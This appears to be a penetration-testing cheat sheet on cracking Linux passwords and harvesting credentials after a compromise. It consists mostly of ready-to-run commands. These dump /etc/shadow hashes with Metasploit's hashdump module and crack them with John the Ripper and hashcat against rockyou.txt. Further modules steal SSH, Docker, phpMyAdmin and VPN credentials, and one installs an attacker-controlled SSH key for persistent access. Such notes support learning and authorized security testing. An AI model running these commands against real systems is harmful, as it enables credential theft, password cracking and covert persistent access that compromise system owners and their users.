# Password Cracker: Linux

- `/etc/shadow` - This file contains hashed passwords for all local users.
- `/etc/passwd` - Holds basic user info, but not the actual password hashes.

**Use the post exploitation module to dump the system users hashes**

```shell 
use post/linux/gather/hashdump
set SESSION 1
exploit
loot
```

**Run the auxiliary module to find the plain text password of the root user.**

```shell
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

The module does **not go out and find hashes by itself**. It depends on the fact that:
1. You (or a post-exploitation module) have already **dumped the hashes** (e.g., from `/etc/shadow`)
2. Metasploit **stored those hashes** in its internal database (via `loot`, `creds`, or `post modules`)
3. `analyze/crack_linux` reads those stored hashes and cracks them

**Using John**

```shell
john --format=sha512crypt <hash_file> --wordlist=<wordlist>
john --format=sha512crypt /root/.msf4/loot/....shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<br>

# Dumping Hashes and Enumeration with MSF modules

```shell
use post/multi/gather/ssh_creds
# Extracts stored SSH credentials (usernames, passwords, keys) from the target system.

use post/multi/gather/docker_creds
# Gathers Docker-related credentials and configuration files from the target.

use post/linux/gather/hashdump
set VERBOSE true
# Dumps password hashes from the /etc/shadow file on a compromised Linux system.

use post/linux/gather/ecryptfs_creds
# Retrieves credentials and keys used for eCryptfs-encrypted home directories.

use post/linux/gather/enum_psk
# Enumerates pre-shared keys (PSKs) used in VPN or wireless configurations on Linux systems.

post/linux/gather/enum_xchat
set XCHAT true
# Extracts stored credentials and logs from the XChat IRC client.

use post/linux/gather/phpmyadmin_credsteal
# Steals stored login credentials from phpMyAdmin configuration files.

use post/linux/gather/pptpd_chap_secrets
# Retrieves usernames and passwords from the PPTP VPN chap-secrets file.

use post/linux/manage/sshkey_persistence
# Installs an attacker-controlled SSH public key on the target to maintain persistent access.
```

<br>

# Cracking with Hashcat

```shell
# Identify the correct mode for SHA-512 (Linux shadow format)
hashcat --help | grep 1800  # 1800 = sha512crypt

# Run Hashcat (mode 1800 for SHA-512, attack mode 0 for dictionary attack)
hashcat -m 1800 -a 0 /root/.msf4/loot/...shadow.txt /usr/share/wordlists/rockyou.txt

# Hashcat will display: <hash>:<plaintext_password>
```
